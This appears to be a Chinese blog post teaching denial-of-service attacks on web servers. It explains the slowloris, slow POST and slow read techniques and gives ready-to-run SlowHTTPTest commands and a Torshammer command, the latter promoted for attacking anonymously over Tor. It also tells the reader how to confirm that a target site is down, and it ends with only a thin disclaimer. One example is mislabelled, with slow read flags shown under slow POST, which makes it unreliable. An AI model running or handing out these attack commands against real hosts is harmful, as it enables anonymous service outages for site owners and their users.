# ddos、http协议、TCP协议攻击工具及使用方法
src:https://blog.csdn.net/shuryuu/article/details/102637622



# 1. Hyenae 

 不做推荐介绍，因为把我自己的路由器玩崩了，本地路由器响应不了那么多的请求，本地电脑不要轻易尝试。感兴趣的自行百度。

# 2. SlowHTTPTest
很好用。

`Slowhttptest`是依赖`HTTP`协议的慢速攻击`DoS`攻击工具，设计的基本原理是服务器在请求完全接收后才会进行处理，如果客户端的发送速度缓慢或者发送不完整，服务端为其保留连接资源池占用，大量此类请求并发将导致`DoS`。

攻击分为以下三种模式：

## 2.1. slowloris
完整的http请求是以`\r\n\r\n`结尾，攻击时仅发送`\r\n`，少发送一个`\r\n`，服务器认为请求还未发完，就会一直等待直至超时。等待过程中占用连接数达到服务器连接数上限，服务器便无法处理其他请求。

## 2.2. slow http post
原理和`slowloris`有点类似，这次是通过声明一个较大的`content-length`后，`body`缓慢发送，导致服务器一直等待

## 2.3. slow read attack
向服务器发送一个正常合法的`read`请求，请求一个很大的文件，但认为的把TCP滑动窗口设置得很小，服务器就会以滑动窗口的大小切割文件，然后发送。文件长期滞留在内存中，消耗资源。这里有两点要注意：

1. `tcp`窗口设置要比服务器的`socket`缓存小，这样发送才慢。
2. 请求的文件要比服务器的`socket`缓存大，使得服务器无法一下子将文件放到缓存，然后去处理其他事情，而是必须不停的将文件切割成窗口大小，再放入缓存。同时攻击端一直说自己收不到。

## 2.4. 安装及使用

在`kali linux`安装`SlowHTTPTest`

```
# apt-get install slowhttptest
```

```
-g      在测试完成后，以时间戳为名生成一个CVS和HTML文件的统计数据
 -H      SlowLoris模式
 -B      Slow POST模式
 -R      Range Header模式
 -X      Slow Read模式
 -c      number of connections 测试时建立的连接数
 -d      HTTP proxy host:port  为所有连接指定代理
 -e      HTTP proxy host:port  为探测连接指定代理
 -i      seconds 在slowrois和Slow POST模式中，指定发送数据间的间隔。
 -l      seconds 测试维持时间
 -n      seconds 在Slow Read模式下，指定每次操作的时间间隔。
 -o      file name 使用-g参数时，可以使用此参数指定输出文件名
 -p      seconds 指定等待时间来确认DoS攻击已经成功
 -r      connections per second 每秒连接个数
 -s      bytes 声明Content-Length header的值
 -t      HTTP verb 在请求时使用什么操作，默认GET
 -u      URL  指定目标url
 -v      level 日志等级（详细度）
 -w      bytes slow read模式中指定tcp窗口范围下限
 -x      bytes 在slowloris and Slow POST tests模式中，指定发送的最大数据长度
 -y      bytes slow read模式中指定tcp窗口范围上限
 -z      bytes 在每次的read()中，从buffer中读取数据量
```

slowloris模式：

```
slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://host.example.com/index.html -x 24 -p 3
```

slow post模式：

```
$ slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://host.example.com/resources/index.html -p 3
```

还有个`HULK/Goldeneye`，不做介绍，基本跟上面这个差不多。

# 3. Torshammer
最大特点是可以通过TOR匿名网络执行攻击，也是针对`http`协议的攻击。

`kali Linux`安装工具：

```
git clone https://github.com/dotfighter/torshammer.git
```

使用方法：

```
cd torshammer
```

命令参考：

```
-t用于目标，某些域或IP地址。
-p用于端口默认值为80. 
-r用于线程，我们想要为此次攻击运行多少个线程。
-T代表定制攻击。
```

举例子：

```
python torshammer.py -t example.com -p 80 -r 5000
```

类似的攻击工具还有`Pyloris`和`Zarp`，可以自行搜索参考使用。经测试，阿里云两核四G的服务器，十秒内就会出现无法响应的状况。更高的配置可以自行测试。

# 4. 检查攻击结果

最后，你已经成功地进行了攻击。请注意，如果该网站正常开放，那么他们已经在一些内容交付网络（`CDN`）上安排了他们的网站，例如`Akamai`，`Cloudflare`，旨在抵御任何类型的`DoS`或`DDoS`攻击。要检查攻击是否成功，您可以去`isitdownrightnow`验证。但是绝大多数配置商用`CDN`的网站，单机是无法撼动的。

免责声明：本文仅供参考。请不要使用本文列举工具执行任何恶意活动。请记住，在定位或攻击任何人的IP /主机名/服务器之前，必须拥有必要的权限或得到许可。


